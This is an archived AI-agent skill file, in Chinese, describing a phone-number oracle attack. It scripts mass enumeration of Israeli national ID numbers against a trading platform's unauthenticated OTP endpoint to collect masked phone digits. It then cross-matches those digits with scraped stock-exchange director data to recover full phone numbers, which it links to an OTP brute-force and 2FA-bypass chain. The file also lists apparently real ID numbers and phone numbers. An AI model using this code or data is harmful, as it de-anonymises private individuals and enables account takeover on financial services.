<!-- archived from /root/.hermes/skills/security/partial-phone-oracle/SKILL.md on 2026-10-21 -->

---
name: partial-phone-oracle
description: >-
  手机号后N位泄露 Oracle + OSINT 交叉比对完整手机号。
  适用场景：OTP 触发接口返回 "XXXXXX1234"（掩码手机号），
  或验证码发送接口提示 "已发送至 xxx****1234"，
  或密码重置提示 "重置链接已发至 xxx@***.com 或 ***1234"。
  通过公开数据（企业注册、职业网络、行业名录）交叉匹配后N位，
  还原完整手机号。触发关键词：手机后4位，掩码手机，XXXXXX，
  Destination，OTP泄露，手机号 oracle，部分手机号，电话枚举。
version: 1.0.0
case: psagot_20260914
---

> 归档卡：原目录 `/root/.hermes/skills/security/partial-phone-oracle`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/partial-phone-oracle/…')`，不要相对 `references/legacy/` 解析。

# 手机号后N位 Oracle + OSINT 交叉比对

**核心思路**：系统返回的掩码手机号（`XXXXXX7191`）是半公开信息。  
结合公开数据源（企业注册、职业网络、行业名录）可以在已知部分位时唯一匹配完整号码。

---

## 何时使用

- OTP 发送接口返回 `{"Destination":"XXXXXX7191"}` — 已知后4位
- 密码重置提示 `已发送至 ****7191` — 已知后4位
- 登录提示 `短信已发至 xxx****7191` — 已知后4位
- 任何接口泄露手机号部分位数（后3、4、5位均适用）

---

## §1 识别 Oracle 端点

```bash
# 触发方式1：OTP 发送接口（无需认证时最有价值）
GET /V2/json2/user/verify?TZ=024958977&method=OTP
→ {"Data":{"Destination":"XXXXXX7191"}}  ← 后4位

# 触发方式2：密码重置接口
POST /api/password/reset
{"email": "<EMAIL-REDACTED>"}
→ {"message": "重置链接已发至手机 ****7191"}

# 触发方式3：登录成功后页面显示
# 触发方式4：账户信息 API 返回掩码手机
GET /api/me
→ {"phone": "***-***-7191"}
```

### 1.1 提取位数

```python
import re

def extract_last_n(destination_str):
    """从 XXXXXX7191 或 ***7191 或 ****-7191 提取末尾数字"""
    # 去掉所有非数字字符，取末尾段
    cleaned = re.sub(r'[^0-9]', '', destination_str)
    if len(cleaned) >= 4:
        return cleaned[-4:]  # 通常取后4位
    return None
```

---

## §2 批量枚举 Oracle

```python
import requests
from concurrent.futures import ThreadPoolExecutor
import json, time

def check_single(target_id, oracle_url, params_func):
    """params_func: 接受 target_id，返回请求参数 dict"""
    try:
        r = requests.get(oracle_url, params=params_func(target_id),
                         verify=False, timeout=8)
        if r.status_code != 200: return None
        data = r.json()
        dest = data.get("Data",{}).get("Destination") or data.get("destination")
        if dest and dest not in ("null", None, ""):
            last4 = ''.join(c for c in str(dest) if c.isdigit())[-4:]
            if len(last4) == 4:
                return {"id": target_id, "last4": last4, "raw": dest}
    except: pass
    return None

# 示例：TASE 董事 TZ 枚举
BASE = "https://trade1-dapi.target.com"
target_tzs = ["024958977", "027378058", "032047565", ...]  # 目标ID列表

results = {}
with ThreadPoolExecutor(max_workers=20) as ex:
    for r in ex.map(lambda tz: check_single(tz, f"{BASE}/V2/json2/user/verify",
                                             lambda t: {"TZ": t, "method": "OTP"}), target_tzs):
        if r: results[r["id"]] = {"destination": r["raw"]}

print(f"命中 {len(results)} 条")
with open("phone_oracle_results.json","w") as f:
    json.dump(results, f, indent=2)
```

---

## §3 OSINT 数据源建立

### 3.1 通用数据源

| 场景 | 数据源 | 含手机号 |
|------|--------|---------|
| 以色列金融/上市公司 | TASE companies 无认证端点、Maya公告 | ✅ 部分 |
| 以色列企业注册 | data.gov.il/companies.gov.il | ✅ 部分 |
| 职业网络 | LinkedIn（需爬取） | ❌ 一般无 |
| 企业名录 | dun.co.il（邓白氏以色列）| ✅ |
| 全球金融监管 | 各国证监会年报附件 | ✅ 部分 |
| 中国企业注册 | 天眼查/企查查 API | ✅ 手机后4位有时直接有 |

### 3.2 以色列 TASE 特定流程

```python
# 从 AIO 无认证端点提取 TASE 董事数据
import requests, json

def get_tase_directors(aio_base):
    # JSON 格式（18MB）
    r = requests.get(f"{aio_base}/V2/json2/market/companies", verify=False, timeout=30)
    companies = r.json().get("Companies",{}).get("Company",[])
    
    directors = {}  # {tz: {name, company, phones}}
    for c in companies:
        company_name = c.get("EngName", c.get("Name",""))
        for dtype in ["Directors","Managers"]:
            for p in c.get(dtype,{}).get("Person",[]):
                tz = p.get("Id","").zfill(9)
                if len(tz) >= 7:
                    directors[tz] = {
                        "name": p.get("EngName", p.get("Name","")),
                        "company": company_name,
                        "phone": p.get("Phone",""),
                        "email": p.get("Email",""),
                    }
    return directors
```

### 3.3 其他公开数据源

```python
# LinkedIn 搜索（手动或 API）
# 搜索: "{姓名} {公司名} Israel"
# 结果里有时包含手机（尤其创业公司创始人）

# 以色列人名 + 公司 → 通过搜索引擎找联系方式
def google_phone_search(name, company):
    query = f'"{name}" "{company}" site:il OR 05[0-9] -9 digits'
    # 注意: 此步骤为 OSINT，只找公开发布过的手机号
    pass
```

---

## §4 交叉比对算法

```python
import json

def cross_match_phones(oracle_results, known_phones_list, min_last_n=4):
    """
    oracle_results: {id: {"destination": "XXXXXX7191"}}
    known_phones_list: ["0546910008", "0549279273", ...] （公开数据库中的手机号）
    min_last_n: 匹配后几位（4=高精度，3=中精度）
    """
    # 清洗公开手机号
    clean_phones = []
    for p in known_phones_list:
        c = ''.join(ch for ch in str(p) if ch.isdigit())
        if len(c) >= 9: clean_phones.append(c)
    
    matches = []
    for target_id, info in oracle_results.items():
        last_n = ''.join(ch for ch in info.get("destination","") if ch.isdigit())[-min_last_n:]
        if len(last_n) < min_last_n: continue
        
        candidates = [p for p in clean_phones if p.endswith(last_n)]
        
        if len(candidates) == 1:
            matches.append({
                "id": target_id,
                "last_n": last_n,
                "phone": candidates[0],
                "confidence": "HIGH",   # 唯一匹配
            })
        elif len(candidates) > 1:
            matches.append({
                "id": target_id,
                "last_n": last_n,
                "candidates": candidates,
                "confidence": f"MEDIUM ({len(candidates)} candidates)",
            })
    
    unique = [m for m in matches if m.get("confidence") == "HIGH"]
    print(f"唯一匹配: {len(unique)} 条 (共{len(matches)} 条命中)")
    return matches

# 使用示例
oracle = json.load(open("phone_oracle_results.json"))
known = ["0546910008","0549279273","0523576315",...]  # 从 TASE/OSINT 提取
results = cross_match_phones(oracle, known, min_last_n=4)
```

---

## §5 精度分析

| 后N位 | 碰撞概率（10000条候选） | 实用性 |
|-------|---------------------|--------|
| 后3位 | 10/10000 = 0.1% | 中（多候选） |
| 后4位 | 1/10000 = 0.01% | 高（通常唯一）|
| 后5位 | 0.1/10000 = 0.001% | 极高（确定唯一）|

**实战数据**（Psagot，110条 oracle，98条公开手机）：
- 命中5条 UNIQUE（唯一匹配） → 完整手机号确认度接近100%
- 0条多候选（因为公开数据库只有98条，基数小）

---

## §6 坑点记录

1. **XXXXXX 是掩码，不是实际前缀** — 只有最后4位有效
2. **手机号清洗** — `050-123-4567` / `0501234567` / `+97250-123-4567` 需统一格式
3. **匹配后验证** — 高置信度匹配仍需交叉验证（搜索引擎确认姓名+手机组合）
4. **地理过滤下 oracle 无效** — 确保 oracle 请求本身能拿到有效后4位（先测已知用户）
5. **公开数据库不代表目标平台数据** — TASE 董事手机是 TASE 的，不是平台内部存储的手机

---

## 关联技能

- `flutter-wcf-fintech-pentest` — 本 Skill 所依赖的 verify Oracle 具体平台
- `idor-testing` — 横向枚举 user ID 触发更多 oracle
- `2fa-bypass` — 拿到手机号后的 OTP 爆破链
